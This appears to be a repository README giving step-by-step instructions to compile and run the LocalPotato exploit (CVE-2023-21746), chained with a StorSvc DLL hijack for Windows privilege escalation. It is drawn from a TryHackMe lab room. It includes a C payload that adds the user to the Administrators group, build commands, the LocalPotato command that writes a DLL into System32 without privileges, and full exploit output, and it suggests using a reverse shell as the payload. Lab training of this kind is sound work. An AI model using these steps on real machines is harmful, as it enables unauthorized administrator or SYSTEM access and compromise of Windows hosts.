# LocalPotato
All the information to compile and execute these binaries comes from the [TryHackMe room for LocalPotato](https://tryhackme.com/room/localpotato)

## Compiling the Exploit

To make use of this exploit, you will first need to compile both of the provided files:

- **SprintCSP.dll**: This is the missing DLL we are going to hijack. The default code provided with the exploit will run the whoami command and output the response to `C:\Program Data\whoamiall.txt`. We will need to change the command to run a reverse shell.
- **RpcClient.exe**: This program will trigger the RPC call to `SvcRebootToFlashingMode`. Depending on the Windows version you are targeting, you may need to edit the exploit's code a bit, as different Windows versions use different interface identifiers to expose `SvcRebootToFlashingMode`.

Let's start by dealing with RpcClient.exe. As previously mentioned, we will need to change the exploit depending on the Windows version of the target machine. To do this, we will need to change the first lines of `RpcClient\RpcClient\storsvc_c.c` so that the correct operating system is chosen. We can use Notepad++ by right-clicking on the file and selecting Edit with Notepad++. Since our machine is running Windows Server 2019, we will edit the file to look as follows:

    #if defined(_M_AMD64)

    //#define WIN10
    //#define WIN11
    #define WIN2019
    //#define WIN2022

    ...

This will set the exploit to use the correct RPC interface identifier for Windows 2019. Now that the code has been corrected, let's open a developer's command prompt (Visual Studio 2022) and build the project by running the following commands:

    C:\> cd RpcClient
    C:\RpcClient> msbuild RpcClient.sln
    ... some output ommitted ...

    Build succeeded.
      0 Warning(s)
      0 Error(s)

    C:\RpcClient> move x64\Debug\RpcClient.exe C:\Users\user\Desktop\
    
The compiled executable will be found on your desktop.

Now to compile SprintCSP.dll, we only need to modify the `DoStuff()` function on `SprintCSP\SprintCSP\main.c` so that it executes a command that grants us privileged access to the machine. For simplicity, we will make the DLL add our current user to the Administrators group. Here's the code with our replaced command:

    void DoStuff() {

      // Replace all this code by your payload
      STARTUPINFO si = { sizeof(STARTUPINFO) };
      PROCESS_INFORMATION pi;
      CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
          NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);

      return;
    }
    
We now compile the DLL and move the result back to our desktop:

    C:\> cd SprintCSP\

    C:\SprintCSP> msbuild SprintCSP.sln
    ... some output ommitted ...

    Build succeeded.
        6 Warning(s)
        0 Error(s)

    C:\SprintCSP> move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\
    
## Running the exploit
To successfully exploit StorSvc, we need to copy SprintCSP.dll to any directory in the current PATH. We can verify the PATH by running the following command:

        C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
            Path    REG_EXPAND_SZ    %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;
                                     %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\;
                                     C:\Program Files\Amazon\cfn-bootstrap\

We will be targeting the %SystemRoot%\system32 directory, which expands to C:\windows\system32. You should be able to use any of the directories, however. Just to be sure, we can try to copy the DLL directly into system32, but our user won't have enough privileges to do it. By using LocalPotato, we can copy SprintCSP.dll into system32 even if we are using an unprivileged user:

        C:\Users\user\Desktop> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 
         LocalPotato (aka CVE-2023-21746)
         by splinter_code & decoder_it
 
        [*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAABTIvXDdMIUbap+AepkeJ/yAcgAAMwIwArWEKZ3vRDmhjkAIwAHAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAEEATQBFAAAABwAxADAALgAxADAALgA0ADAALgAyADMAMQAAAAAACQD//wAAHgD//wAAEAD//wAACgD//wAAFgD//wAAHwD//wAADgD//wAAAAA=:
        [*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
        [*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
        [*] Received DCOM NTLM type 1 authentication from the privileged client
        [*] Connected to the SMB server with ip 127.0.0.1 and port 445
        [+] SMB Client Auth Context swapped with SYSTEM
        [+] RPC Server Auth Context swapped with the Current User
        [*] Received DCOM NTLM type 3 authentication from the privileged client
        [+] SMB reflected DCOM authentication succeeded!
        [+] SMB Connect Tree: \\127.0.0.1\c$  success
        [+] SMB Create Request File: Windows\System32\SprintCSP.dll success
        [+] SMB Write Request file: Windows\System32\SprintCSP.dll success
        [+] SMB Close File success
        [+] SMB Tree Disconnect success

With our DLL in place, we can now run RpcClient.exe to trigger the call to SvcRebootToFlashingMode, effectively executing the payload in our DLL:

        C:\Users\user\Desktop> RpcClient.exe
        [+] Dll hijack triggered!
        
To verify if our exploit worked as expected, we can check if our user is now part of the Administrators group:

        C:\Users\user\Desktop> net user user
